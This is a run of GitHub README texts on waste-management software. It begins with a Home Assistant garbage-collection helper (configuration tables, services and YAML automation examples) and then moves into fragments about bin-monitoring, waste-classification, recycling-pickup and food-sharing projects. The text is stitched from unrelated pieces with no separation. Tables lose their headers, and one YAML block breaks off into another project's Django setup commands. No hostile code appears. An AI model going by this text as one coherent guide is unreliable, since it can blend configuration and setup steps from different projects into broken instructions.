## End of Support

Home Assistant has introduced local calendars in 2022, in the 2023.1 release they added an option for different recurent events. With this, most of the functionality of this custom helper is supported natively. So I will end developing and supporting this helper in 2023.

# Garbage Collection

The `garbage_collection` component is a Home Assistant helper that creates a custom sensor for monitoring a regular garbage collection schedule. The sensor can be configured for a number of different patterns:

- `weekly` schedule (including multiple collection days, e.g. on Tuesday and Thursday)
- `every-n-weeks` repeats every `period` of weeks, starting from the week number `first_week`. It uses the week number - therefore, it restarts each year, as the weeks start from number 1 each year.
- bi-weekly in `even-weeks` or `odd-weeks` (technically, it is the same as every 2 weeks with 1<sup>st</sup> or 2<sup>nd</sup> `first_week`)
- `every-n-days` (repeats regularly from the given first date). If n is a multiply of 7, it works similar to `every-n-weeks`, with the difference that it does not use the week numbers (that restart each year) but continues infinitely from the initial date.
- `monthly` schedule (n<sup>th</sup> weekday each month), or a specific weekday of each n<sup>th</sup> week. Using the `period` it could also be every 2<sup>nd</sup>, 3<sup>rd</sup> etc month.
- `annually` (e.g. birthdays). This is once per year. Using include dates, you can add additional dates manually.
- `blank` does not automatically schedule any collections - to be used in cases where you want to make completely own schedule with `manual_update`.

You can also configure seasonal calendars (e.g. for bio-waste collection), by configuring the first and last month.
And you can `group` entities, which will merge multiple schedules into one sensor.

These are some examples using this sensor. The Lovelace config examples are included below.

## Installation

### MANUAL INSTALLATION

1. Download the
   [latest release](https://github.com/bruxy70/garbage_collection/releases/latest).
2. Unpack the release and copy the `custom_components/garbage_collection` directory
   into the `custom_components` directory of your Home Assistant
   installation.
3. Restart Home Assistant.
4. Configure the `garbage_collection` helper.

### INSTALLATION VIA Home Assistant Community Store (HACS)

1. Ensure that [HACS](https://hacs.xyz/) is installed.
2. Search for and install the ""Garbage Collection"" integration.
3. Restart Home Assistant.
4. Configure the `garbage_collection` helper.

## Configuration

Go to `Settings`/`Devices & Services`/`Helpers`, click on the `+ CREATE HELPER` button, select `Garbage Collection` and configure the helper.<br />If you would like to add more than one collection schedule, click on the `+ CREATE HELPER` button again and add another `Garbage Collection` helper instance.

**The configuration hapend in 2 steps.** In the first step, you select the `frequency` and common parameters. In the second step you configure additional parameters depending on the selected frequency.

_The configuration via `configuration.yaml` has been deprecated. If you have previously configured the integration there, it will be imported to ConfigFlow, and you should remove it._

| `First week` | No       | First collection on the `""first week""` week (integer 1-53)<br/>**Default**: 1<br/>_(The week number is using [ISO-8601](https://en.wikipedia.org/wiki/ISO_8601#Week_dates) numeric representation of the week)<br/><br/>Note: This parameter cannot be used to set the beginning of the collection period (use the `first month` parameter for that). The purpose of `first week` is to simply 'offset' the week number, so the collection every ;'n' weeks does not always trigger on week numbers that are multiplication of 'n'. Technically, the value of this parameter shall be less than `period`, otherwise it will give weird results. Also note, that the week numbers restart each year. Use `every-n-days` frequency if you need a consistent period across the year ends._ |

#### ...FOR COLLECTION EVERY-N-DAYS

| :----------- | :------- | :---------------------------------------------------------------------------------------------------------------------------------------------------- |
| `First date` | Yes      | Repeats every n days from this first date<br/>(date in the international ISO format `'yyyy-mm-dd'`).                                                  |
| `Period`     | No       | Collection every `""period""` days (warning - in this configuration, it is days, not weeks!)<br/>**Default**: 1 (daily, which makes no sense I suppose) |

#### ...FOR MONTHLY COLLECTION

The monthly schedule has two flavors: it can trigger either on the **n<sup>th</sup> occurrence of the weekday** in a month, or on the weekday in the **n<sup>th</sup> week** of each month.

| Parameter                                 | Required | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| :---------------------------------------- | :------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Order of weekday`                        | Yes      | List of week numbers of `collection day` each month. E.g., if `collection_day` is `""sat""`, 1 will mean 1<sup>st</sup> Saturday each month (integer 1-5)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| `Order of week, instead of weekday order` | No       | **CONFIGURE THIS ONE ONLY IF YOU ARE SURE YOU NEED IT**. This will **alter** the behaviour of `order of weekday`, so that instead of n<sup>th</sup> weekday of each month, take the weekday of the n<sup>th</sup> week of each month.</br>So if the month starts on Friday, the Wednesday of the 1<sup>st</sup> week would actually be last Wednesday of the previous month and the Wednesday of 2<sup>nd</sup> week will be the 1<sup>st</sup> Wednesday of the month. So if you have just randomy clicked on the option, it might appear as if it calculates a wrong date! Yes, this is confusing, but there are apparently some use case for this. |
| `Period`                                  | No       | If `period` is not defined (or 1), the schedule will repeat monthly. If `period` is 2, it will be every 2<sup>nd</sup> month. If `period` is 3, it will be once per quarter, and so on.<br/>The `first month` parameter will then define the starting month. So if the `first month` is `jan` (or not defined), and `period` is 2, the collection will be in odd months (`jan`, `mar`, `may`, `jul`, `sep` and `nov`). If `first month` is `feb`, it will be in even months. (integer 1-12)<br/>**Default**: 1                                                                                                                                        |

| :-------- | :------- | :----------------------------------------------------------------------------------- |
| `Date`    | Yes      | The date of collection, in format `'mm/dd'` (e.g. '11/24' for November 24 each year) |

#### ...FOR GROUP

| Parameter          | Required | Description                     |

| `List of entities` | Yes      | A list of `entity_id`s to merge |

## Blueprints for Manual Update

### Prerequisites

1. To use the **blueprints**, you need to set the `garbage_collection` entity for `Manual update`, that will fire the `garbage_collection_loaded` event on each sensor update and trigger the automation **blueprint**.
2. Install/Import **blueprint**
3. From the **blueprint**, create and configure the automation

### Public Holidays

There are a couple of **blueprints**, automatically moving the collection falling on a public holiday. Or if there was a public holiday in the week before the scheduled collection.

The Public Holidays **blueprints** use a separate custom helper **Holidays**, available through **HACS**, that you can configure for different countries.

### Offset

The offset blueprint will move the calculated collections by a number of days. This can be used, for example, to schedule collection for last Saturday each month - just set the collection to the first Saturday each month and offset it by -7 days.

### Import txt

This **blueprint** requires a `command_line` sensor reading content of a txt file, containig a set of dates, one per line.

<details>
<summary>command_line sensor example</summary>

The Home Assistant command line sensor has a 255 character limitation. For many people this causes an issue where the sensor only imports part of the list. To overcome this limitation, @stu1811 came up with this brilliant solution.

Create a script that shows next 20 dates from the current day forward.

#### **`/share/import_dates.sh`**

```bash
#!/bin/bash
new_dates=$(for x in $(cat /share/import_dates.txt); do
                if [[ $(date -d $x +""%y%m%d"") -ge $(date +""%y%m%d"") ]]; then
                    echo $x
                fi
            done)
echo ""$new_dates"" | head -n20
```

Then, create the command line sensor taking the output of this script.

#### **`configuration.yaml`**

```yaml
sensor:
  - platform: command_line
    name: Import dates
    command: ""sh /share/import_dates.sh""
```

</details>

### Monthly on a fixed date

This will create a schedule on a fixed date each month. For example on the 3rd each month. The helper does not allow it, as it is generally designed around paterns evolving around weekly schedules (since garbage collection typically happens on a set day in a week, rather than set day in a month). But few of you wanted that, so here you go.

## STATE AND ATTRIBUTES

### State

The state can be one of

| Value | Meaning                |
| :---- | :--------------------- |
| `0`   | Collection is today    |
| `1`   | Collection is tomorrow |
| `2`   | Collection is later    |

If the `verbose_state` parameter is set, it will show the date, and the remaining days. For example: ""Today"" or ""Tomorrow"" or ""on 10-Sep-2019, in 2 days"" (configurable)

### Attributes

| Attribute         | Description                              |
| :---------------- | :--------------------------------------- |
| `next_date`       | The date of next collection              |
| `days`            | Days till the next collection            |
| `last_collection` | The date and time of the last collection |

## Services

### `garbage_collection.collect_garbage`

If the collection is scheduled for today, mark it completed and look for the next collection.
It will set the `last_collection` attribute to the current date and time.

| Attribute         | Description                                                                                                                                                                                                                              |
| :---------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `entity_id`       | The garbage collection entity id (e.g. `sensor.general_waste`)                                                                                                                                                                           |
| `last_collection` | (optional) Set the last collection date to this value. This can be used to re-set the next collection calculation, if the last collection date was set in error. If omitted, it will set the last collection to the current date & time. |

## Manual update

There are standard [blueprints](#blueprints-for-manual-update) provided to handle manual updates - to move collection on public holidays or offset the collection.

If these **blueprints** do not work for you, you can create your own custom rules to handle any scenario. If you do so, please share the blueprints with the others by posting them to the [blueprints directory](https://github.com/bruxy70/Garbage-Collection/tree/master/blueprints) - someone else might find them useful. Thanks!
To help you with creating custom automations, see the following examples:

```

### `garbage_collection.add_date`

Add a date to the list of dates calculated automatically. To add multiple dates, call this service multiple-times with different dates.
Note that this date will be removed on the next sensor update, when the data is re-calculated and loaded. This is why, this service should be called from the automation triggered by the event `garbage_collection_loaded`. This event is called each time the sensor is updated. And at the end of this automation, you need to call the `garbage_collection.update_state` service to update the sensor state based on automatically collected dates, and the dates added, removed, or offset by the automation.

| Attribute   | Description                                                                                  |
| :---------- | :------------------------------------------------------------------------------------------- |
| `entity_id` | The garbage collection entity id (e.g. `sensor.general_waste`)                               |
| `date`      | The date to be added, in ISO format (`'yyyy-mm-dd'`). Make sure to enter the date in quotes! |

### `garbage_collection.remove_date`

Remove a date to the list of dates calculated automatically. To remove multiple dates, call this service multiple-times with different dates.
Note that this date will be removed on the next sensor update, when the data is re-calculated and loaded. This is why, this service should be called from the automation triggered by the event `garbage_collection_loaded`. This event is called each time the sensor is updated. And at the end of this automation, you need to call the `garbage_collection.update_state` service to update the sensor state based on automatically collected dates, and the dates added, removed, or offset by the automation.

| Attribute   | Description                                                                                    |
| :---------- | :--------------------------------------------------------------------------------------------- |
| `entity_id` | The garbage collection entity id (e.g. `sensor.general_waste`)                                 |
| `date`      | The date to be removed, in ISO format (`'yyyy-mm-dd'`). Make sure to enter the date in quotes! |

### `garbage_collection.offset_date`

Offset the calculated collection day by the `offset` number of days.
Note that this date will be removed on the next sensor update, when the data is re-calculated and loaded. This is why, this service should be called from the automation triggered by the event `garbage_collection_loaded`. This event is called each time the sensor is updated. And at the end of this automation, you need to call the `garbage_collection.update_state` service to update the sensor state based on automatically collected dates, and the dates added, removed, or offset by the automation.

| Attribute   | Description                                                                                    |
| :---------- | :--------------------------------------------------------------------------------------------- |
| `entity_id` | The garbage collection entity id (e.g. `sensor.general_waste`)                                 |
| `date`      | The date to be removed, in ISO format (`'yyyy-mm-dd'`). Make sure to enter the date in quotes! |
| `offset`    | By how many days to offset - integer between `-31` to `31` (e.g. `1`)                          |

### `garbage_collection.update_state`

Choose the next collection date from the list of dates calculated automatically, added by service calls (and not removed), and update the entity state and attributes.

| Attribute   | Description                                                    |
| :---------- | :------------------------------------------------------------- |
| `entity_id` | The garbage collection entity id (e.g. `sensor.general_waste`) |

## Events

### `garbage_collection_loaded`

This event is triggered each time a `garbage_collection` entity is being updated. You can create an automation to modify the collection schedule before the entity state update.

Event data:
| Attribute | Description |
| :-- | :-- |
| `entity_id` | The garbage collection entity id (e.g. `sensor.general_waste`) |
| `collection_dates` | List of collection dates calculated automatically. |

## Manual update examples

For the example below, the entity should be configured with `manual_update` set to `true`.
Then, when the `garbage_collection` entity is updated (normally once a day at midnight, or restart, or when triggering entity update by script), it will calculate the collection schedule for previous, current and next year. But it will **NOT UPDATE** the entity state.
Instead, it will trigger an event `garbage_collection_loaded` with a list of automatically calculated dates as a parameter.
You will **have to create an automation triggered by this event**. In this automation, you will need to call the service `garbage_collection.update_state` to update the state. Before that, you can call the services `garbage_collection.add_date` and/or `garbage_collection.remove_date` and/or `garbage_collection.offset_date` to programmatically tweak the dates in whatever way you need (e.g. based on values from external API sensor, comparing the dates with the list of holidays, calculating custom offsets based on the day of the week etc.). This is complicated but gives you the ultimate flexibility.

## Simple example

Adding an extra collection date (a fixed date in this case) - for the entity `sensor.test`.

```yaml
alias: garbage_collection event
description: ""Manually add a collection date, then trigger entity state update.""
trigger:
  - platform: event
    event_type: garbage_collection_loaded
    event_data:
      entity_id: sensor.test
action:
  - service: garbage_collection.add_date
    data:
      entity_id: ""{{ trigger.event.data.entity_id }}""
      date: ""2022-01-07""
  - service: garbage_collection.update_state
    data:
      entity_id: sensor.test
mode: single
```

## Moderate example

This will loop through the calculated dates, and add an extra collection to a day after each calculated one. So if this is set for a collection every first Wednesday each month, it will result in a collection on the first Wednesday, and the following day (kind of first Thursday, except if the week is starting on Thursday - just a random weird example :).

This example is for an entity `sensor.test`. If you want to use it for yours, replace it with the real entity name in the trigger.

```yaml
alias: test garbage_collection event
description: ""Loop through all calculated dates, add extra collection a day after the calculate one""
trigger:
  - platform: event
    event_type: garbage_collection_loaded
    event_data:
      entity_id: sensor.test
action:
  - repeat:
      for_each: ""{{ trigger.event.data.collection_dates }}""
      sequence:
        - service: garbage_collection.add_date
          data:
            entity_id: ""{{ trigger.event.data.entity_id }}""
            date: >-
              {{( as_datetime(repeat.item) + timedelta( days = 1)) | as_timestamp | timestamp_custom(""%Y-%m-%d"") }}
  - service: garbage_collection.update_state
    data:
      entity_id: ""{{ trigger.event.data.entity_id }}""
mode: single
```

## Advanced example

This is an equivalent of ""holiday in week"" move - checking if there is a public holiday on the calculated collection day, or earlier in the week. And if yes, moving the collection by one day. This is fully custom logic, so it could be further complicated by whatever rules anyone wants.

This example is for an entity `sensor.test`. If you want to use it for yours, replace it with a real entity name in the trigger.

```yaml
alias: test garbage_collection event
description: >-
  Loop through all calculated dates, move the collection by 1 day if a public holiday was in the week before or on the calculated collection date calculate one
trigger:
  - platform: event
    event_type: garbage_collection_loaded
    event_data:
      entity_id: sensor.test
action:
  - repeat:
      for_each: ""{{ trigger.event.data.collection_dates }}""
      sequence:
        - condition: template
          value_template: >-
            {%- set collection_date = as_datetime(repeat.item) %}
            {%- set ns = namespace(found=false) %}
            {%- for i in range(collection_date.weekday()+1) %}
              {%- set d = ( collection_date + timedelta( days=-i) ) | as_timestamp | timestamp_custom(""%Y-%m-%d"") %}
              {%- if d in state_attr(trigger.event.data.entity_id,'holidays') %}
                {%- set ns.found = true %}
              {%- endif %}
            {%- endfor %}  
            {{ ns.found }}
        - service: garbage_collection.offset_date
          data:
            entity_id: ""{{ trigger.event.data.entity_id }}""
            date: ""{{ repeat.item }}""
            offset: 1
  - service: garbage_collection.update_state
    data:
      entity_id: ""{{ trigger.event.data.entity_id }}""
mode: single
```

# Lovelace config examples

For information/inspiration - not supported.

## Garbage Collection custom card

You can use the custom [garbage collection card](https://github.com/amaximus/garbage-collection-card) developed by @amaximus.

<img src=""https://github.com/amaximus/garbage-collection-card/blob/master/garbage_collection_lovelace.jpg"">

## With images (picture-entity)

This is what I use (I like images). I use a horizontal stack of picture-entities, with `card-templater` plugin ([Lovelace Card Templater](https://github.com/gadgetchnnel/lovelace-card-templater)) to show the number of days:

<img src=""https://github.com/bruxy70/Garbage-Collection/blob/master/images/picture-entity.png"">

(The `state` is designed to be used as traffic lights. That's why it has 3 values. You obviously cannot use this with `verbose_state`)

This is the configuration

```yaml
- type: ""custom:card-templater""
  card:
    type: picture-entity
    name_template: >-
      {{ state_attr('sensor.bio','days') }} days
    show_name: True
    show_state: False
    entity: sensor.bio
    state_image:
      ""0"": ""/local/containers/bio_today.png""
      ""1"": ""/local/containers/bio_tomorrow.png""
      ""2"": ""/local/containers/bio_off.png""
  entities:
    - sensor.bio
```

## List view (entities)

The simplest visualization is to use entities. In this case, I use `verbose_state` to show `state` as text.

<img src=""https://github.com/bruxy70/Garbage-Collection/blob/master/images/entities.png"">

Lovelace configuration

```yaml
- type: entities
  entities:
    - sensor.general_waste
    - sensor.bio
    - sensor.paper
    - sensor.plastic
```

## Icon view (glance)

Lovelace Configuration

```yaml
- type: glance

> pip3 install -r requirements.txt

Then, to run the Django project, simply execute
> python manage.py runsever

Garbage Truck Monitoring System is a role based system having three roles admin, driver and a citizen. Admin has a dashboard from which admin can add resources such as drivers, bins, depot, dumping ground and vehicles. Admin will have facility of viewing the current data in the system and monitor the drivers in real time. 

![Alt text](screenshots/dashboard.jpeg?raw=true ""Dashboard"")


The new bin location can be added by just clicking on the map or writing the address of the actual location. Its capacity and height needs to be entered as those parameters will be used to calculate real time garbage level of the bin.  

![Alt text](screenshots/addBin.jpeg?raw=true ""Add a bin"")


The bin status will be shown to admin wherein bins are classified into three categories based on the level of garbage. Red, yellow and green bins represent overfilled bin, normally filled bin and underfilled bin respectively.

![Alt text](screenshots/binStatus.jpeg?raw=true ""Bin Status"")


The routes will be generated using our algorithm which follows the approach followed by CVRP algorithm. Daily, routes will be generated taking into account the real time garbage level, capacity of vehicles, the distance between bins, etc. G Maps API provides an efficient way and real time distances according to the traffic parameter for the inputs.

This Waste Management System is a web application aimed to provide a digital way of complaining the concerns of general citizens to their relative municipalities.,"# [Waste Management System](https://waste-managemnt-system.000webhostapp.com/)

As we know, importance of waste management has always been a great concern nowadays. The world is sinking into the sea of waste. Every narrow nooks and corner of the streets are being piled up with waste. Waste management reduces the effect of waste on the environment, health, and so on. It can also help reuse or recycle resources, such as; paper, cans, glass, and so on. There is various type of waste management that include the disposal of solid, liquid, gaseous, or hazardous substances. 



The ‘Waste Management System’ is a web application aimed to provide a digital way of complaining the concerns of general citizens to their relative municipalities.
1. Complaining about waste or garbage problems near their locality.
2. See thier complain Report and check if the work is done! or not.
3. people can take different ideas regarding recycling of waste through this website.

Complaining about the waste problem encountered everyday to municipality is hefty process and waste management aims to make this process easier. With a simple handheld device with access to internet, user can use this platform complain their concerns to municipality . The automated system will redirect the complains .The municipality admins at the receiving side can acknowledge the reports which lets the users whether their complain is adddressed or not.

# AquaVision
Official dataset introduced in the paper [AquaVision: Automating the detection of waste in water bodies using deep transfer learning](https://doi.org/10.1016/j.cscee.2020.100026)

# AquaTrash

This dataset contains 369 images of Trash used for deep learning. Each image is manually labelled by our team for accurate detections making a total of 470 bounding boxes. There are total 4 classes {(0: glass), (1:paper), (2:metal), (3:plastic)}

# Usage
1. Each image stored in the images folder has one or more labelled bounding boxes. 
2. The labelled bounding box are stored in the annotations.csv file with the following format:
  ```
  <file_path>,<x_min>,<y_min>,<x_max>,<y_max>

## ML Based Waste Segregator

#### This Repository consists of 2 branch, ML code and backend Flask app is in flask-app branch and React.js web-app is in react-app branch. So do check both branch's readme.

#### Checkout our webpage:<a href=""https://waste-segregation-frontend.herokuapp.com""> Here </a>

#### 1. What is the definition that you are working on 
We are working on the poblem of Waste Management. We have observed that a lot cities, states and even countries faces problem on how to manage waste. Waste Management system have a golden 3R rule Recycle Reuse Reduce. But, it becomes more effecient if we include also consider the classification in Biodegradable and Non Biodegradable. As the Biodegradable waste can be used to produce biogas and various useful side products. 
    
#### 2. How are we trying to solve the problem ?
Here, we are making Deep Learning Model of Waste segregation which will identify the type of waste i.e., Biodegradable, Non-Biodegradable (Sub class: Recyclable, Resuable). This model then can be deployed at the dumping area, where the waste will be rolled on the conveyer-belt, then the Mechanic machine can segregate the waste. Since, the mechanic model is not possible in online mode, we will be deploying this model on a website, where the images of waste can be uploaded, and the model classify it.

#### 3. The Tech stack we used
Tensorflow, Flask, React.js, Heroku

#### 4. Working of our project
We have developed Machine Learning app which classify image of waste into Biodegradable and Non-Biodegradable. This app is deployed at this [link1](https://ml-waste-segregation.herokuapp.com/). This app serves as backend and server for the frontend app, which is deployed at this [link2](https://wastesegregation-react.herokuapp.com/). The frontend app is made by using React. One can upload the image of the waste, then there will be output of image with its types. Both of this apps are deployed on heroku separately and integrated with each other.

The availability of widely adopted (de-facto standard) information models is key for creating a global digital single market of interoperable and replicable (portable) IoT-enabled smart solutions in multiple domains. Such models provide an essential element in the common technical ground needed for standards-based open innovation and procurement.

Data Models play a crucial role because they define the harmonised representation formats and semantics that will be used by applications both to consume and to publish data.

The Smart Data Models board (FIWARE Foundation, TM Forum, OASC and IUDX) are leading a joint collaboration program to support the adoption of a reference architecture and compatible common data models that underpin a digital market of interoperable and replicable smart solutions in multiple sectors.

This GitHub repository contains links to the repositories where different groups or data models are contained. Data models are documented in JSON Schemas and automatic documentation is generated based on the schemas.

Submission the [Climate Change AI Hackathon 2019, Montreal](https://climate-change-ai-hackathon.devpost.com/), see [DevPost post](https://devpost.com/software/yocco-you-only-live-once).
We have created an application that uses Deep Learning to detect objects and classifies the method for waste management (recycling, compost, trash, hazardous).

## Motivation
The more we recycle, the less garbage winds up in our landfills and incineration plants. By reusing aluminum, paper, glass, plastics, and other materials, we can save production and energy costs, and reduce the negative impacts that the extraction and processing of virgin materials has on the environment. New products can be made from your recyclable waste material.
It all comes back to you. **Recycling gets down to one person taking action.** 

## Webapp

Built with Flask. Following [this tutorial](https://github.com/avinassh/pytorch-flask-api-heroku/blob/master/README.md).

Run the server:

	FLASK_ENV=development FLASK_APP=app.py python3.5 -m flask run

And upload pictures to try out the garbage detection AI. Example test images are in `test_images`.

## Image Recognition
Our image recognition models are based on pre-trained models (DenseNet121 and MobileNet, trained on ImageNet) provided by [Torch](https://pytorch.org/docs/stable/torchvision/models.html) and [Keras](https://keras.io/applications/#mobilenet). We fine-tuned MobileNet to classify garbage material based on the [TrashNet data collection](https://github.com/garythung/trashnet).

# REDIVIVUS
An end-to-end recyclable waste management website.<br/>
Successfully Deployed using firebase hosting. View the deployment [here](https://redivivuspickupguy.web.app/).<br/>

## Problem Statement 
To design and create a product (website) where users / consumers / retailers can easily schedule their recyclable waste pickup according to their convenience with standardized pricing across cities 

## Objectives

<img align=""right"" width=""40%"" src=""https://github.com/Vivek-Hotti/REDIVIVUS/blob/main/images%26visuals/stakeholders.JPG""> 

* To bridge the gap between various stake holders of the Recyclable Waste ecosystem. 
* Facilitate a dynamic website to users with a personalized experience to each one.
* Help the user to schedule pickup according to their convenience.


## General Flow

In the existing system, the journey of a user who wants to sell his recyclable waste, starts with uncertainty and ends with frustation and disatisfaction.

Our main purpose remains to simplify and enhance user experience, consistent pricing along with efficient recyclable waste logistics and transparency at every level.
The solution to the existing flawed system is: a recyclable waste management website.

The user comes on our website through the internet. As soon as he enters the website, he is asked to Login / Signup. After which he could schedule a pickup from his home by
entering the date and time according to his convenience.

As soon as we receive a request, we take a note of the date and timing that the user has entered. We send our representative to the users’ house at the requested date and time. To ensure transparency we use a digital weighing machine and then and there itself reimburse the predecided amount to the user.

On the spot, the waste is segregated by our well-informed and trained representative into different commodities. Then we directly contact the recycling plants nearest to the locality of the user and drop of the recyclable waste to the recycling plant at minimum commission.

The paper was published to a local conference ([CIIT](http://ciit.finki.ukim.mk/)) in 2018. <br>

## Abstract 
This repo contains all of the codes for the prototype explained in the paper. I wrote it during my 2nd year of Computer Science studies and the idea for the garbage bin came to me while solving a Calculus exam question. The paper shortly elaborates the idea (it has some issues) for building a self-sustained sensor system, a hypothetical network composed of nodes implementing the Riemann Garbage Bin (RGB) model. The model is named after the creator of the formula, Riemann Sum approximaties an integral by a finite sum.

<p align=""center"">
<img src=""https://raw.githubusercontent.com/zelenelez/images/master/model.png"" width=45%;></img>
</p>

Hence, the case study explores the potential of employing sensor-enabled systems to improve waste monitoring and management in public waste bins. The network consists of wireless nodes that use ultrasonic sensors to measure the space in the bins. The sensors periodically report the fill rate of the waste bins to a sensor gateway that is based on the Long Range Wide Area Network (LoRaWAN) protocol. For our LoRaWAN server and network cover, we choose to use The Things Network (TTN). These fill rates would be monitored by a mobile or web application connected to the network server. The goal of this project is through the Internet of Things (IoT) to monitor all the waste bins in one city, to improve garbage management by relocating resources, and by giving insight to the public about this global health threatening problem.

## Functional application (React Native)

This application was produced as part of a larger project course where the following aim was adressed *“Create a feedback loop from individualized user data to create incentives to improve waste management behaviour.”*. The application is intended to be used as a complementary feedback loop for residents in Stockholm Royal Seaport (SRS) http://www.stockholmroyalseaport.com/ where an automated vacuum system for waste management is implemented. The application utilizes gamification, and considers various psychological aspects to improve sorting and management of waste. Read more about the project and our story: https://erikskogetun.github.io/WasteManagement/.

### Run project locally

The application is built in React Native and Expo. So simply run `npm install` to install all the dependencies, and then `npm start` to run the app in Expo. Then follow the instruction to run in simulator or on native device. We built the app mainly to support iOS and iPhone 11 Pro Max, but should work fine with some minor adjustments for other devices and Android as well.

### Your waste, our responsibility.

### Problem
In the 21st century, <b>lack of a proper waste management system</b> is one of the
biggest problems faced around the world. Out of the 62 million tonnes of
waste generated annually, only 43 million tonnes is collected, out of which
11.9 million tonnes is treated and 31 million tonnes is dumped in landfill
sites. This system urgently calls for a change.
<br>
### Analysis
According to a study, you can actually improve and <b>reduce this waste by
over 15% just by segregating it</b> properly at the first hand.
<br>

### Solution
Owing to this, we are introducing a start-up idea, Klear – a mobile app
for waste management. 
<br><br>
Through our app, we encourage people to
contribute to reducing the amount of waste by ensuring that a proper waste
segregation system is followed.
<br><br>
* In our app, we have inculcated a mathematical solution using <b>convolutional
neural networks</b> (a machine learning interface) created by us that <b>lets users
classify their waste</b> into different 7 different classes and further place a
pickup order through our app. This makes it easier for the users to
conveniently segregate and dispose their waste. Instead of dumping that
waste, <b>we deliver it to the recyclers for better utilisation</b>. This way we’re
saving the environment. For incentivizing our solution, the <b>users also earn
Klear Credits in the form of digital money in proportion to the waste
contributed which can be further used on e-commerce portals</b>.
<br><br>
* For instance, if a user does not want to sell his ‘waste’, he can use the DIY
feature of our app. <b>The DIY feature gives out various step-by-step best out
of waste suggestions</b> in reference to the waste the user has classified.
<br><br>
* We also allow our users to donate the digital money earned by selling their
waste through the Klear Donation Form. We have ties with local NGOs, blind schools, orphanages, and old-age homes that receive the digital money
you donate through our app.

# Abstract
Harvest Easy represents a modern solution for an old and known problem: domestic waste sorting, resolving this at 360 degrees. We designed this from the really ground root, starting from the 3D CADs of the prototype up to the backend AI-powered solution and the user-friendly front-end, all equipped with the needed sensors & acturators. We started 3D printing with an organic plastic polymere (PLA) the bin prototype where we added on this the RFID reader, 16x2 LCD screen, two ESP32, different ultrasonic sensors HC-SR04, DHT11 for temperature and humidity, MQ135 for CO2 & air quality sensoring, MPU-6050 as accellerometer and gryscope module, 5W photovoltaic panel, MG90s Hi-Torque servo for the automatic lid opening, 14500 Li rechargable battery and a Solar Panel Managment with BMS (Battery Managment System) module.

During the night the bin is powered by a battery which is recharged by a solar panel during the day.
Energy management is managed by the BMS which switches between the battery and the panel based on the energy supplied by the panel itself

The bin can be in one out four states: empty and intact (state 1), full and intact (state 2), empty but tampered (state 3), full and tampered (state 4). The tampered state is achieved when the bin is knocked over or set on fire. Each time the bin lid is opened (by users or operators) its internal fill level and, consequently, the status is updated. If the bin is knocked over or set on fire, a notification will be sent to the apartment users through the telegram bot. If the problem cannot be solved, a report is also sent to the body responsible for waste collection (or public service) which will resolve it.

The telegram bot will give points to every user that solves a reported problem. We introduced this gamification system in which points can be earned and are eventually shown on a leaderboard through both the telegram bot and the service webpage. In this way we wanted to make users more aware & active towards our society.

In order to discourage and avoid the abandonment of waste next to the bin if happens to be full, Harvest Easy introduces a ""proximity access"" system: when the tenant swipes the card to authenticate in order to leave the trash but the bin happens to be full, the street address of the nearest free bin (respecting the waste sorting) will be shown on the screen (this is achieved thanks to open routing services built on top of OSM nodes).

Harvest Easy provides access to city maps through which it is possible to see all the bins present in the city of interest. We already implemented many intresing filters to satisfy both the commercial & analytics side and the wasting retrieval company one.

To improve the waste collection system, Harvest Easy is able to predict the possible future fill level, thanks to a time series model prediction. This feature is useful both for users and the company.

Harvest Easy provides a waste collection optimization system: taking into account the type of vehicle, the bins to be emptied, the prediction of bins close to being filled, and the fuel level to show the optimal route for the operator to travel. In this way only the full or almost full ones will be included in the retrieval path and is also already implemented a feature that computes the approximate kWh needed for the round trip, in this way only the (possibly autonomous but electrical) trucks with enough autonomy will depart.


# Goals and Reasons

## React Frontend

Once the apartment manager scans the bin group QR code for initialization he will be automatically redirected to the ap. init. portal on which he will add all the apartment infos such as:
- Location infos (apartment name, street, number, city)
- Tenants infos (how many, data for each including their telegram username)
- Waste sorting infos (which sorting that apartment will follow)

<img height=""600"" alt=""pic"" src=""./res/gif/apartment-init.gif""> 

<hr>


After the manager inits the apartment each user will be able to login

<img height=""600"" alt=""pic"" src=""./res/gif/user-login.gif""> 

<hr>

After the user logs in the apartment dashboard will be shown, here the status of each bin, infos about the apartment and future predictions are shown

<img height=""600"" alt=""pic"" src=""./res/gif/user-home.gif""> 



## Telegram Bot

Each user will be able to report for damages thus earning points, some special roles like civil servants, police etc will also be able to fix the damage and flag that; these roles won't earn points with the logic that is their duty to do this.


As we can see in this clip the bot (backend) is the first to multicast to every user in that city the damage, this is possible thank to the bin sensors which allow us to detect tampering as fire, overthrow or maximum capacity reached (this last is not flagged to users).

We introduced this bot along the city limited leaderboard for citizen too as a gamification of this problem

Love Food, Hate Waste

## Goal  
Ending hunger and food waste within our lifetimes.

## Mission
Connect businesses with excess edible food to feed those in need, instantly.

## Overview
Our platform uses technology to streamline the process of food recovery and distribution, giving businesses and organizations the power to fight hunger and food waste within minutes. The application helps to  minimize food wastage by effectively rescuing the excess food from weddings, parties, restaurants and temples and redeploying food resources in an efficient manner.

In this way, we wish to bridge the gap between these issues by connecting people and ensuring that the untouched left over food, can be distributed to people in need of food through reliable local NGO partners.

## Work flow

1. Share Food
Users who have excess food post their details such as - location, time when the food was made, number of people, cuisine type and additional data.

2. Transport Food
Anyone who can transport food, can contribute by delivering food from one location to another.

3. Request Food
NGOs or people who manage orphanages/shelter homes can request for food based on their requirements.

